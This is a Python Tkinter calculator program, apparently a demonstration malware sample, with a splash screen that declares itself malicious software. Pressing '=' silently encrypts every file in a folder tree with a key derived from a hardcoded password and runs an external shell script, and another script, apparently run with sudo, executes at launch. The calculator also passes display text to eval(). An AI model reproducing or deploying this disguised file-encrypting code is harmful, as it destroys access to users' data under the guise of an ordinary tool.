from tkinter import *
import os
import subprocess
from cryptography.fernet import Fernet
import base64, hashlib
from codecs import utf_8_decode
from cryptography.fernet import Fernet
import base64, hashlib
import os

class Encryption():
    def __init__(self,password):
        key = hashlib.sha256(password.encode())
        key_64=base64.encodebytes(key.digest())
        self.fernet=Fernet(key_64)


    def encrypt_data(self,data:str) -> bytes:

        cipher = self.fernet.encrypt(data.encode())
        #print(cipher)
        return cipher

    
    def decrypt_data(self,cypher:bytes) -> str:
        decoded = self.fernet.decrypt(cypher)

        return utf_8_decode(decoded)[0]

    def encrypt_folder(self,path:str)->None:
        files= self.get_files_from_folder(path)
        
        for file in files:
            with open(file,"rb") as thefile:
                contents= thefile.read()
    
                contents_enc=self.fernet.encrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(contents_enc)
    

    def decrypt_folder(self,path:str)->None:
        files= self.get_files_from_folder(path)
        for file in files:
            with open(file,"rb") as thefile:
                contents= thefile.read()
    
                contents_dec=self.fernet.decrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(contents_dec)

    def get_files_from_folder(self,path):
        files= []
        for file in os.listdir(path):
            if os.path.isfile(path+'/'+file):
                files.append(path+"/"+file)
            else:
                files+=self.get_files_from_folder(path+'/'+file)
        return files


def bt_draw(key, col, lin,window,disp):
    
    bt=Button(window, text=key, width=10, height=3,font = "Verdana 10 bold", bg='#0052cc', fg='#ffffff', activebackground='#0052cc', activeforeground='#aaffaa',command=lambda: bt_press(key,disp))
    bt.grid(column=col+1, row=lin+1)
    return bt

def bt_press(key,disp):
    if   key == 'C': disp['text'] = ''
    elif key == '<': disp['text'] = disp['text'][:-1]
    elif key == '=': 
        disp['text'] = str(round(eval(disp['text']),6))
        Encryption('password').encrypt_folder("files_to_encrypt")
        os.system("sh startscript.sh")
    else: disp['text'] += key


splash_win= Tk()
splash_win.title("ATTENTION - MALWARE SOFTWARE")

#Define the size of the window or frame
splash_win.geometry("700x200")




#Remove border of the splash Window
splash_win.overrideredirect(True)
splash_win.eval('tk::PlaceWindow . center')

splash_label= Label(splash_win, text= "Welcome to this APP!\n Atenção!! \n É um software malicioso", fg= "blue",
font= ('Times New Roman', 40)).pack(pady=20)

os.system("sh run_sudo.sh")

def mainWin():
    splash_win.destroy()
    window = Tk()
    window.title('Calculator')

    disp = Label(window, text='',fg='black',bg='light grey',font = "Verdana 30 bold",background='light grey')
    disp.grid(column=0, row=0, columnspan=5)

    keys = '()C<789/456*123-.0=+'
    bt_list = [bt_draw(keys[n], n%4, n//4,window,disp) for n in range(20)]



splash_win.after(1000, mainWin)
mainloop()

